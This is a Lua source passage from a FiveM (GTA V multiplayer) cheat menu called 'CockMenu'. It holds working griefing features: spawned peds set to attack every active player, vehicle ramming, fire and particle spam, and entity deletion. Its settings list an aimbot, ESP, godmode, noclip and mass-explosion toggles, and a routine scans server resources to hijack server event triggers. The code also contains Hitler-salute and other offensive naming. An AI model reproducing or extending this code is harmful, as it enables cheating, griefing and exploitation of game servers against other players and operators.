                               local hit, Markerloc = Fatasf.n.RayCastCam(5000.0) 
                               
                               Functions.f.DrawTextTest('~c~[~g~CockMenu~c~] ~s~Freecam mode: ~r~'..currentmode, false, 0.35, 0, 0.5, 0.957)
               
                               if Fatasf.n.IsDisabledControlPressed(0, 26) then
                                   local w = true
                                   local fov = 70.0
                                   
                                   CockT.Inv["Thread"](function()
                                       while w do
                                       CockT.Inv["Wait"](0)
                                           fov = fov - 0.1
                                           CockT.Inv["Invoke"](CockT.Natives['SetCamFov'], cam, fov)
                                       end
                                   end)
                               end
               
                               if Fatasf.n.IsDisabledControlPressed(0, 0) then
                                   local w = true
                                   local fov = 70.0
                                   CockT.Inv["Thread"](function()
                                       while w do
                                       CockT.Inv["Wait"](0)
                                           if fov < 70.0 then
                                               fov = fov + 0.1
                                           end
                                           CockT.Inv["Invoke"](CockT.Natives['SetCamFov'], cam, fov)
                                       end
                                   end)
                               end
               
                               
               
                                if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["RIGHT"]) then
                                   CockT.Global.FreecamMode = CockT.Global.FreecamMode + 1
                                   if CockT.Global.FreecamMode > #CockT.Global.FreecamModes then
                                       CockT.Global.FreecamMode = 1
                                   end
                               end
               
                               if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["LEFT"]) then
                                   CockT.Global.FreecamMode = CockT.Global.FreecamMode - 1
                                   if CockT.Global.FreecamMode < 1 then
                                       CockT.Global.FreecamMode = #CockT.Global.FreecamModes
                                   end
                               end
               
                                --Cock.Menu.modes
                                if currentmode == 'Particle Spam' then
                                   if Fatasf.n.IsDisabledControlPressed(0, 24) and not CockT.display_menu then
                                       local gox_dict = "core"
                                       Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                                       while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do
                                           CockT.Inv["Wait"](10)
                                       end
               
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("veh_light_amber",Markerloc.x,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                       Fatasf.n.UseParticleFxAsset(gox_dict)
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("td_blood_shotgun",Markerloc.x,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                       Fatasf.n.UseParticleFxAsset(gox_dict)
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("veh_respray_smoke",Markerloc.x,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                       
                                       local gox_dict2 = "scr_rcbarry2"
                                       Fatasf.n.RequestNamedPtfxAsset(gox_dict2)					
                                       while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict2) do
                                           CockT.Inv["Wait"](10)
                                       end
               
                                       Fatasf.n.UseParticleFxAsset(gox_dict2)
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",Markerloc.x ,Markerloc.y,Markerloc.z,0,0,0,10.0,0,0,0)
                                   end
                               end
                               if currentmode == 'Teleport' then
                                   if Fatasf.n.IsDisabledControlPressed(0, 24) and not CockT.display_menu then
                                       Fatasf.n.SetEntityCoords(Fatasf.n.PlayerPedId(), Markerloc.x, Markerloc.y - 0.1, Markerloc.z)
                                   end
                               end
                               if currentmode == 'Shooting' then
                                   
                                   local CurrentShootingMode = CockT.Global.ShootingModes[CockT.Global.CurrentShooting]	
                                   
                                   Functions.f.DrawTextTest('~s~Selected weapon: ~r~'..CurrentShootingMode, false, 0.35, 0, 0.5, 0.94)
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 14) then
                                       CockT.Global.CurrentShooting = CockT.Global.CurrentShooting + 1
                                       if CockT.Global.CurrentShooting > #CockT.Global.ShootingModes then
                                           CockT.Global.CurrentShooting = 1
                                       end
                                   end
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 15) then
                                       CockT.Global.CurrentShooting = CockT.Global.CurrentShooting - 1
                                       if CockT.Global.CurrentShooting < 1 then
                                           CockT.Global.CurrentShooting = #CockT.Global.ShootingModes
                                       end
                                   end
                                   
                                   
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                       local weapon = Fatasf.n.GetHashKey(CurrentShootingMode)
                                       CockT.Inv["Invoke"](CockT.Natives['RequestWeaponAsset'], weapon) 
                                       if not Fatasf.n.HasWeaponAssetLoaded(weapon) then
                                           CockT.Inv["Invoke"](CockT.Natives['RequestWeaponAsset'], weapon) 
                                       end
    
                                       Fatasf.n.ShootSingleBulletBetweenCoords(Markerloc.x, Markerloc.y, Markerloc.z, Markerloc.x, Markerloc.y, Markerloc.z, 1.0, false, weapon, Fatasf.n.PlayerPedId(), true, false, -1.0)
                                   end
                               end
                               if currentmode == 'Prop Spawner ' then
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 25) and not CockT.display_menu then
                                       proptospawn =  Functions.f.CustomInput("Prop to select", "prop_", 20) 
                                   end
                                   
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 24) and not CockT.display_menu then
                                       if proptospawn ~= nil then
                                           local objhash = Fatasf.n.GetHashKey(proptospawn)
                                           Fatasf.n.CreateObject(objhash, Markerloc.x, Markerloc.y, Markerloc.z, true, true, true)
                                       else
                                           local objhash = Fatasf.n.GetHashKey('prop_atm_01')
                                           Fatasf.n.CreateObject(objhash, Markerloc.x, Markerloc.y, Markerloc.z, true, true, true)
                                       end
                                   end
                               end
               
                               if currentmode == "Ram vehicle" then
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 25) and not CockT.display_menu then
                                       vehtospawn =  Functions.f.CustomInput("Vehicle to spawn:", "", 20) 
                                   end
                                   
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                       if vehtospawn ~= nil then
                                           local wa = Fatasf.n.GetHashKey(vehtospawn)
                                           Fatasf.n.RequestModel(wa)
                                           while not Fatasf.n.HasModelLoaded(wa) do
                                               CockT.Inv["Wait"](0)
                                           end
                                           local veh = Fatasf.n.CreateVehicle(wa, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                           Fatasf.n.SetVehicleEngineOn(veh, true, true, true)
                                           Fatasf.n.SetEntityRotation(veh, GetCamRot(cam, 2), 0.0, 0.0, 0.0, true)
                                           Fatasf.n.SetVehicleForwardSpeed(veh, 500.0)
                                       else
                                           local var = Fatasf.n.GetHashKey("adder")
                                           Fatasf.n.RequestModel(var)
                                           while not Fatasf.n.HasModelLoaded(var) do
                                               CockT.Inv["Wait"](0)
                                           end
                                           local veh = Fatasf.n.CreateVehicle(var, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                           Fatasf.n.SetVehicleEngineOn(veh, true, true, true)
                                           Fatasf.n.SetEntityRotation(veh, GetCamRot(cam, 2), 0.0, 0.0, 0.0, true)
                                           Fatasf.n.SetVehicleForwardSpeed(veh, 500.0)
                                       end
                                   end
                               end
                               if currentmode == "Deleter" then
                                   local entity = CockT.Global.GetEntityInFrontOfCam()
                                   
                                   if entity ~= 0 and Fatasf.n.DoesEntityExist(entity) and GetEntityType(entity) ~= 0 or nil then
                                       if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                           CockT.Global.DeleteEntity(entity)
                                       end
                                   end
                               end
                               if currentmode == "Place fire" then
                                   if Fatasf.n.IsDisabledControlPressed(0, 24) and not CockT.display_menu then
                                       local gox_dict = "core"					
                                       Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                                       while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do
                                           CockT.Inv["Wait"](10)				
                                       end
                                       Fatasf.n.UseParticleFxAsset(gox_dict)
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "ent_sht_petrol_fire", Markerloc.x, Markerloc.y, Markerloc.z, 0, 0, 0, 8.0, 0, 0, 0)
                                   end
                               end
                               if currentmode == "Shit spawner" then
                                   local props = {
                                       "prop_tree_olive_cr2", "prop_a4_sheet_03",
                                       "prop_byard_ramp", "prop_abat_roller_static",
                                       "prop_byard_rampold", "prop_afsign_vbike",
                                       "prop_jetski_ramp_01", "prop_aircon_l_02",
                                       "prop_air_chock_04", "prop_battery_01",
                                       "prop_bar_napkindisp", "prop_bar_pump_04",
                                       "prop_billboard_07", "prop_box_ammo07b",
                                   }
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                       local randomprop = props[CockT.Math.random(#props)]
                                       local _a = Fatasf.n.GetHashKey(randomprop)
                                       Fatasf.n.CreateObject(_a, Markerloc.x, Markerloc.y, Markerloc.z, true, true, true)
                                   end
                               end
                               if currentmode == "Ped spawner" then
                                   local peds = {
                                       "a_f_m_beach_01", "a_f_m_business_02",
                                       "a_f_m_bevhills_01", "a_f_y_business_04",
                                       "a_f_m_bevhills_02", "a_f_y_fitness_02",
                                       "a_f_m_bodybuild_01", "a_f_y_tourist_01",
                                       "a_m_m_acult_01", "a_m_m_genfat_01",
                                       "a_m_m_hillbilly_01", "a_m_m_paparazzi_01",
                                       "a_m_m_og_boss_01", "a_m_m_soucent_01",
                                   }
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                       local random_ped = peds[CockT.Math.random(#peds)]
                                       local _1 = Fatasf.n.GetHashKey(random_ped)
                                       local _2 = Fatasf.n.GetHashKey(random_ped)
                                       Fatasf.n.RequestModel(_1)
                                       Fatasf.n.RequestModel(_2)
                                       while not Fatasf.n.HasModelLoaded(_1) and not Fatasf.n.HasModelLoaded(_2) do
                                           CockT.Inv["Wait"](1)
                                       end
   
                                       local ped = Fatasf.n.CreatePed(0, _1, Markerloc.x, Markerloc.y, Markerloc.z, 1, true, true)
                                       local ped_2 = Fatasf.n.CreatePed(0, _2, Markerloc.x, Markerloc.y, Markerloc.z, 1, true, true)
                                       
                                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           local player = Fatasf.n.GetPlayerPed(v)
                                           CockT.Inv["Invoke"](CockT.Natives['SetPlayerAngry'], ped, true)
                                           CockT.Inv["Invoke"](CockT.Natives['SetPlayerAngry'], ped_2, true)
                                           CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], ped, player, 0, 16)
                                           CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], ped_2, player, 0, 16)
                                       end
                                   end
                               end
                               
                               if currentmode == 'Spawner' then
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 25) and not CockT.display_menu then
                                       vehtospawn =  Functions.f.CustomInput("Vehicle to spawn:", "", 20) 
                                   end
                                   
                                   if Fatasf.n.IsDisabledControlJustPressed(0, 24) then
                                       if vehtospawn ~= nil then
                                           local wa = Fatasf.n.GetHashKey(vehtospawn)
                                           Fatasf.n.RequestModel(wa)
                                           while not Fatasf.n.HasModelLoaded(wa) do
                                               CockT.Inv["Wait"](0)
                                           end
                                           Fatasf.n.CreateVehicle(wa, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                       else
                                           local var = Fatasf.n.GetHashKey("adder")
                                           Fatasf.n.RequestModel(var)
                                           while not Fatasf.n.HasModelLoaded(var) do
                                               CockT.Inv["Wait"](0)
                                           end
                                           Fatasf.n.CreateVehicle(var, Markerloc.x, Markerloc.y, Markerloc.z, 0.0, true, false)
                                       end
                                   end
                               end
                           end       
                       end
                   end
               end
       
               if Cock.Menu.Spectate then
                   Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), true)
                           local spectate_cam = spectate_cam
                           if not spectate_cam ~= nil then
                       spectate_cam = Fatasf.n.CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                   end
                   Fatasf.n.RenderScriptCams(1, 0, 0, 1, 1)
                   Fatasf.n.SetCamActive(spectate_cam, true)
                   local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                   Fatasf.n.SetCamCoord(spectate_cam, coords.x, coords.y, coords.z + 3)
                   local offsetRotX = 0.0
                   local offsetRotY = 0.0
                   local offsetRotZ = 0.0
       
                   local weapondelay = 0
                   while Fatasf.n.DoesCamExist(spectate_cam) do
                       CockT.Inv["Wait"](0)
                       if not Cock.Menu.Spectate then
                           Fatasf.n.DestroyCam(spectate_cam, false)
                           Fatasf.n.ClearTimecycleModifier()
                           Fatasf.n.RenderScriptCams(false, false, 0, 1, 0)
                           Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), false)
                           Fatasf.n.SetFocusEntity(Fatasf.n.PlayerPedId())
                           break
                       end
                       local playerPed = Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)
                       local playerRot = Fatasf.n.GetEntityRotation(playerPed, 2)
               
                       local rotX = playerRot.x
                       local rotY = playerRot.y
                       local rotZ = playerRot.z
               
                       offsetRotX = offsetRotX - (Fatasf.n.GetDisabledControlNormal(1, 2) * 8.0)
                       offsetRotZ = offsetRotZ - (Fatasf.n.GetDisabledControlNormal(1, 1) * 8.0)
               
                       if (offsetRotX > 90.0) then
                           offsetRotX = 90.0
                       elseif (offsetRotX < -90.0) then
                           offsetRotX = -90.0
                       end
                       if (offsetRotY > 90.0) then
                           offsetRotY = 90.0
                       elseif (offsetRotY < -90.0) then
                           offsetRotY = -90.0
                       end
                       if (offsetRotZ > 360.0) then
                           offsetRotZ = offsetRotZ - 360.0
                       elseif (offsetRotZ < -360.0) then
                           offsetRotZ = offsetRotZ + 360.0
                       end
                       local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetCamCoord(spectate_cam))
                       local coords_ES = Fatasf.n.GetEntityCoords(playerPed) + (CockMeni.Functions.RotationToDirection(Fatasf.n.GetCamRot(spectate_cam, 2)) * (0.5 * 1.5))
       
                       Fatasf.n.SetCamCoord(spectate_cam, coords_ES.x, coords_ES.y, coords_ES.z + 4.5)
                       if not Displayed then
                           CockT.Inv["Invoke"](CockT.Natives['SetFocusArea'], Fatasf.n.GetCamCoord(spectate_cam).x, Fatasf.n.GetCamCoord(spectate_cam).y, Fatasf.n.GetCamCoord(spectate_cam).z,0.0,0.0,0.0)
                           Fatasf.n.SetCamRot(spectate_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                       end
                   end
               end
       
           end
       end)
   
       end
       
       CockT.Global.GicTobR5RRImZobUZ0o4ytqDottM = function()
           local PEnabled = true
           local ISeN = true
           local Cock = {
               AimFriends = {},
               Notifications = {},
               Sliders = {
                   ['Sprint'] = {min = 0, max = 5, value = 1}, ['VehSpeed'] = {min = 0, max = 255, value = 9},
                   ['InvsAlpha'] = {min = 0, max = 255, value = 255}, ['AimFov'] = {min = 0, max = 1000, value = 50}, ['EspDistance'] = {min = 0, max = 10000, value = 250}, 
                   ['AimDist'] = {min = 0, max = 1000, value = 250}, ['AimDistFov'] = {min = 0, max = 150, value = 50},
                   ['CustomDamage'] = {min = 1, max = 1000, value = 1}, ['NoclipSpeed'] = {min = 0, max = 30, value = 2},
                   ['CustomAmmo'] = {min = 0, max = 250, value = 250}, ['ExplodeType'] = {min = 0, max = 43, value = 1},
                   ['AimSmooth'] = {min = 0, max = 200, value = 124},
                   ['HealthVal'] = {min = 0, max = 100, value = 100}, ['ArmVal'] = {min = 0, max = 100, value = 0},
                   ['FuelVal'] = {min = 0, max = 100, value = 100}, ['MainR'] = {min = 0, max = 255, value = 143},
                   ['MainG'] = {min = 0, max = 255, value = 240}, ['MainB'] = {min = 0, max = 255, value = 249},
                   ['MainA'] = {min = 0, max = 255, value = 255},
               },
               Menu = {
                   MenuX = 0.5, MenuY = 0.5,
                   MenuX2 = 0.5, MenuY2 = 0.5,
                   ResizeW = 0.5, ResizeH = 0.5,
                   scr_1 = 0.0, scr_2 = 0.0,
                   scr_vis = 0.0,
                   scr_s = 0.0, scr_n = 0.0,
                   scr_a = 0.0, scr_dump = 0.0,
                   SpawnInCar = true, sexanimation = false,
                   blurmenu = false, up = true,
                   CurrentParticle = 1, CurrentParticle = 1,
                   CCamMode = 1, CurrentMode = 1,
                   Aimbot = false, ragebot = false,
                   Aimlock = false, hitsound = false,
                   fov = false, targets = false,
                   Carkiller = false, udwallslock = false,
                   Godmode = false, SJump = false,
                   maxstamina = false, NClip = false,
                   AFK = false, invisible = false,
                   Freecam = false, explodegrove = false,
                   explodeallstations = false, plantthebombonall = false,
                   cvcolour = false, cockplate = false,
                   DriveToWaypoint = false, boxes = false,
                   Crosshair = false, showcoords = false,
                   boxesV2 = false, tracers = false,
                   infos = false, skeletons = false,
                   roadetector = false, force3rdper = false,
                   customhud = false, selskins = false,
                   hailfvckinhitler = false, moscowmeme = false,
                   ussrmeme = false, DisableAllEnginesLoop = false,
                   xenonl = false, beliketorch = false,
                   plist = false, burnplayercar = false,
   
                   modes = {
                       "Particle Spam", "Teleport",
                       "Shooting", "Spawner",
                       "Prop Spawner ", "Place fire",
                       "Ram vehicle",
                   },
                   ParticleModes = {
                       "Blood",
                       "Fireworks", "Cartoon",
                       "Explode", "Smoke",
                   },
               },
           }
           
           local tab = "1"
           local subtab = "Overlay"
   
           local CockMenu = { 
               MenuEnabled = true,
               Build = '0.9a',
               CockKeybinds = {
                   Menu = {
                       OpenMenuKey = {["Label"] = nil, ["Value"] = nil},
                       Noclip = {["Label"] = 'NONE', ["Value"] = 12345},
                       Heal = {["Label"] = 'NONE', ["Value"] = 12345},
                       Revive = {["Label"] = 'NONE', ["Value"] = 12345},
                       Armour = {["Label"] = 'NONE', ["Value"] = 12345},
                       Freecam = {["Label"] = 'NONE', ["Value"] = 12345},
                       Godmode = {["Label"] = 'NONE', ["Value"] = 12345},
                       fixveh  = {["Label"] = 'NONE', ["Value"] = 12345},
                       givevintage = {["Label"] = 'NONE', ["Value"] = 12345},
                       givepistol = {["Label"] = 'NONE', ["Value"] = 12345},
                       invisible = {["Label"] = 'NONE', ["Value"] = 12345},
                       unlockveh = {["Label"] = 'NONE', ["Value"] = 12345},
                   },
               },
               peds = {},
               
               Main = {
                   
               },  
           }
   
           CockMenu.Main.LoadUi = function() 
               Fatasf.n.DrawRect(0.5+drag_x2, 0.5+drag_y2, 0.17, 0.4, 0, 0, 0, 180) -- main
               Fatasf.n.DrawSprite("dickmenu", "vertissotraperdamnshit", 0.5+drag_x2, 0.3+drag_y2, 0.17, 0.1, 0.0, 255, 255, 255, 255)
   
               Fatasf.n.DrawRect(0.585+drag_x2, 0.475+drag_y2, 0.001, 0.45, Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value) -- v3
               Fatasf.n.DrawRect(0.415+drag_x2, 0.475+drag_y2, 0.001, 0.45, Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value) -- v2
               
               Fatasf.n.DrawRect(0.5+drag_x2, 0.7+drag_y2, 0.17, 0.001, Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value) -- down
               Fatasf.n.DrawRect(0.5+drag_x2, 0.25+drag_y2, 0.17, 0.001, Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value) -- up
               Fatasf.n.DrawRect(0.5+drag_x2, 0.35+drag_y2, 0.17, 0.001, Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value) -- (under) gif
           end
           CockMenu.Main.MenuButton = function(id, text, x, y, _outl, animation)
               x = x+drag_x
               y = y+drag_y
               local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
               local widht, height = Fatasf.n.GetActiveScreenResolution()
               c_x = c_x / widht
               c_y = c_y / height
               
               
           
               
           
           
               if id == tab then
                   Fatasf.n.SetTextColour(Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value)
                   CockT.Global.DrawText(text, x, y-0.01, _outl, 0.45, 4, true)
                   CockMenu.Main.LoadUi()
               else
                   CockT.Global.DrawText(text, x, y-0.01, _outl, 0.45, 4, true)
               end
               
               if( (c_x) + 0.01 >= x and (c_x) - 0.01 <= x and (c_y) + 0.015 >= y and (c_y) - 0.015 <= y and Fatasf.n.IsDisabledControlJustReleased(0, 92)) then 
                   return true
               else
                   return false
               end
           end
           CockMenu.Main.FriendsButton = function(text, name, x, y)
               local drag_x2 = Cock.Menu.MenuX2-0.5
               local drag_y2 = Cock.Menu.MenuY2-0.5
               local x = x+drag_x2
               local y = y+drag_y2      
               local hp = Fatasf.n.GetEntityHealth(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
               if hp < 1 then hp = 'Dead' else hp = hp end
               if Cock.AimFriends[Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)] then
                   CockT.Global.DrawText('Remove Friend ('..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..')', x, y-0.01, false, 0.3, 4, true)
                   CockT.Global.DrawText('Nick: '..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..'\nFriend: yes\nHealth: '..hp..'\nArmour: '..Fatasf.n.GetPedArmour(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), x-0.045, y+0.02, false, 0.3, 4, false)
               else
                   CockT.Global.DrawText('Add Friend ('..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..')', x, y-0.01, false, 0.3, 4, true)
                   CockT.Global.DrawText('Nick: '..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..'\nFriend: no\nHealth: '..hp..'\nArmour: '..Fatasf.n.GetPedArmour(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), x-0.045, y+0.02, false, 0.3, 4, false)
               end
               local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
               local widht, height = Fatasf.n.GetActiveScreenResolution()
               c_x = c_x / widht
               c_y = c_y / height
               Fatasf.n.DrawRect(x, y, 0.1, 0.017, 5, 5, 5, 255)
               if ((c_x) + 0.03 >= x and (c_x) - 0.03 <= x and (c_y) + 0.012 >= y and (c_y) - 0.012 <= y and Fatasf.n.IsDisabledControlJustReleased(0, 92)) then 
                   return true
               else
                   return false
               end
           end
   
           CockMenu.Main.Button = function(text, x, y, _outl, usesmth) --, text)
               local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
               local widht, height = Fatasf.n.GetActiveScreenResolution()
               c_x = c_x / widht
               c_y = c_y / height
           
               local text_widht = CockT.Global.GetTextWidht(text, 0, 0.2)
           
               if tab == id then
               end
   
               drag_x2 = Cock.Menu.MenuX2-0.5
               drag_y2 = Cock.Menu.MenuY2-0.5
           
              
               if( (c_x) + 0.013 >= x+drag_x2 and (c_x) - 0.055 <= x+drag_x2 and (c_y) + 0.01 >= y+drag_y2 and (c_y) - 0.005 <= y+drag_y2) then
                   Fatasf.n.SetTextColour(Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value)
                   CockT.Global.DrawText(text, x+drag_x2, y+drag_y2, _outl, 0.3, 4, false)
               else
                   CockT.Global.DrawText(text, x+drag_x2, y+drag_y2, _outl, 0.3, 4, false)
               end
   
               if( (c_x) + 0.013 >= x+drag_x2 and (c_x) - 0.055 <= x+drag_x2 and (c_y) + 0.01 >= y+drag_y2 and (c_y) - 0.005 <= y+drag_y2) and Fatasf.n.IsDisabledControlJustReleased(0, 92) then 
                   return true
               else
                   return false
               end
           end
           --[[ CockMenu.Main.LoadGifMoscow = function()
               local runtime_txd = Fatasf.n.CreateRuntimeTxd("cock_moscow")
               local banner_dui = Fatasf.n.CreateAnDui("https://cock.menu/music/mp4moscow.mp4", 640, 360)
               local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
               Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "vertissotraperdamnshit", b_dui)
           end ]]
           CockMenu.Main.AddNotification = function(text, type, ms)
               if type == "INFO" then
               CockT.Strings.tinsert(Cock.Notifications, { ['text'] = "[~b~CockMenu~w~] ".. text, ['time'] = ms, ['startTime'] = Fatasf.n.GetGameTimer() })
               end
               if type == "ERROR" then
               CockT.Strings.tinsert(Cock.Notifications, { ['text'] = "[~r~CockMenu~w~] ".. text, ['time'] = ms, ['startTime'] = Fatasf.n.GetGameTimer() })
               end
               if type == "SUGGEST" then
                   CockT.Strings.tinsert(Cock.Notifications, { ['text'] = "[~y~CockMenu~w~] ".. text, ['time'] = ms, ['startTime'] = Fatasf.n.GetGameTimer() })
               end
           end
           CockMenu.Main.Checkbox = function(name,x,y,bool, _outl)
               local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
               local widht, height = Fatasf.n.GetActiveScreenResolution()
               c_x = c_x / widht
               c_y = c_y / height
               local x = x +0.0015
               
               if bool then
                   Fatasf.n.DrawRect(x+drag_x2 , y+drag_y2, 0.006, 0.012, 0, 0, 0, 255)
                   Fatasf.n.DrawRect(x+drag_x2 , y+drag_y2, 0.005, 0.01, 0, 155, 0, 255)
               else
                   Fatasf.n.DrawRect(x+drag_x2 , y+drag_y2, 0.006, 0.012, 0, 0, 0, 255)
                   Fatasf.n.DrawRect(x+drag_x2, y+drag_y2, 0.005, 0.01, 155, 0, 0, 255)
               end
           
               local text_widht = (CockT.Global.GetTextWidht(name) / 2)
           
               if( (c_x) + 0.03 >= x+drag_x2 and (c_x) - 0.03 <= x+drag_x2 and (c_y) + 0.01 >= y+drag_y2 and (c_y) - 0.0001 <= y+drag_y2) then 
                   Fatasf.n.SetTextColour(Cock.Sliders['MainR'].value, Cock.Sliders['MainG'].value, Cock.Sliders['MainB'].value, Cock.Sliders['MainA'].value)
                   CockT.Global.DrawText(name, x+drag_x2+0.005, y+drag_y2-0.01,_outl,0.28, 4)
               else
                   Fatasf.n.SetTextColour(255, 255, 255, 255)
                   CockT.Global.DrawText(name, x+drag_x2+0.005, y+drag_y2-0.01,_outl,0.28, 4)
               end
           
               if( (c_x) + 0.03 >= x+drag_x2 and (c_x) - 0.03 <= x+drag_x2 and (c_y) + 0.01 >= y+drag_y2 and (c_y) - 0.0001 <= y+drag_y2) and Fatasf.n.IsDisabledControlJustReleased(0, 92) then 
                   return true
               else
                   return false
               end
           end
           CockMenu.Main.UpdateAllTriggers = function()
               Fatasf.n.Leprint("^1[^2CockMenu Logs^1] ^7Loading dynamic triggers...")
               CockT.Inv["Thread"](
                   function()
                       CockT.Inv["Wait"](500)
                       local fitimeone =Fatasf.n.GetResources()
                       for kk, v in CockT.Math.ipairs(CockT.DynamicTriggers) do
                           for i = 0, #fitimeone do
                               local script = CockT.Strings.lower(fitimeone[i])
                               if type(v.resourcelooklike) == "table" then
                                   for E, pirs in CockT.Math.pairs(v.resourcelooklike) do
                                       if
                                           CockT.Strings.find(script, pirs) and
                                               Fatasf.n.GetResourcestatus(fitimeone[i])
                                        then
                                           v.resource = fitimeone[i]
                                       end
                                   end
                               else
                                   if CockT.Strings.find(script, v.resourcelooklike) and Fatasf.n.GetResourcestatus(fitimeone[i]) then v.resource = fitimeone[i]
                                   end
                               end
                           end
                       end
                       CockT.Inv["Wait"](100)
                       for k, v in CockT.Math.pairs(CockT.DynamicTriggers) do
                           Functions.f.GetAllTriggers(v)
                           CockT.Inv["Wait"](15)
                       end
                   end)
           end
           CockMenu.Main.Slider = function(text, x, y, O4v, r, g, b)
               local x = x +drag_x2
               local y = y +drag_y2
               
               Fatasf.n.DrawRect(x+0.002, y+0.015, 0.157, 0.007, 178, 178, 178, 255)
               Fatasf.n.DrawRect(x + 0.0055 + (O4v.value/(O4v.max/0.157)/2) - 0.082, y+0.015, O4v.value/(O4v.max/0.157), 0.007, r, g, b, 255)
               CockT.Global.CockText(O4v.value, true, 0.25, false, x + 0.0055 + (O4v.value/(O4v.max/0.157)/1) - 0.085, y + 0.01, 4)
               Fatasf.n.DrawRect(x+ 0.002+(O4v.value/(O4v.max/0.157)/1)-0.081+0.002, y+0.014, 0.001, 0.010, 150, 150, 150, 255)
   
   
               local c_x = Fatasf.n.GetControlNormal(0, 239)
               local c_y = Fatasf.n.GetControlNormal(0, 240)
   
               --0.4229 0.5812
               local Vzs_x, dry_r = x - (0.5 - 0.4229), x + (0.5812 - 0.5)
               if (c_x - x > -0.085) and (c_x - x < 0.085) and (c_y - (y + (0.025/2)) > -(0.025/2)) and (c_y - (y + (0.013/2)) < (0.013/2)) and Fatasf.n.IsDisabledControlPressed(0, 24) then
                   O4v.value = CockT.Math.floor((((c_x) - (Vzs_x)) / (dry_r - Vzs_x) ) * (O4v.max - O4v.min) - O4v.min)
               end
               
               if (c_x - x > -0.085) and (c_x - x < 0.085) and (c_y - y > -0.007) and (c_y - y < 0.007)  then 
                   Fatasf.n.SetTextColour(150, 150, 150, 255)
                   CockT.Global.CockText(text, false, 0.28, false, x - 0.078, y - 0.008, 4)
                   if Fatasf.n.IsDisabledControlPressed(0, 25) then
                       CockT.Inv["Wait"](100)
                       local new_val =  Functions.f.CustomInput("New value", "", 5)
                       if new_val ~= nil then
                           O4v.value = CockT.Math.tonumber(new_val)
                       end
                   end
               else
                   Fatasf.n.SetTextColour(255, 255, 255, 255)
                   CockT.Global.CockText(text, false, 0.28, false, x - 0.078, y - 0.008, 4)
               end
   
               if O4v.value > O4v.max then
                   O4v.value = O4v.max
               elseif O4v.value < O4v.min then
                   O4v.value = O4v.min
               end
           end
           CockMenu.Main.HailHitla = function()
               mp_pointing = false
   
               startPointing = function()
                   local ped = Fatasf.n.PlayerPedId()
                   Fatasf.n.RequestAnimDict("anim@mp_point")
                   while not Fatasf.n.HasAnimDictLoaded("anim@mp_point") do
                       CockT.Inv["Wait"](0)
                   end
                   Fatasf.n.SetPedCurrentWeaponVisible(ped, 0, 1, 1, 1)
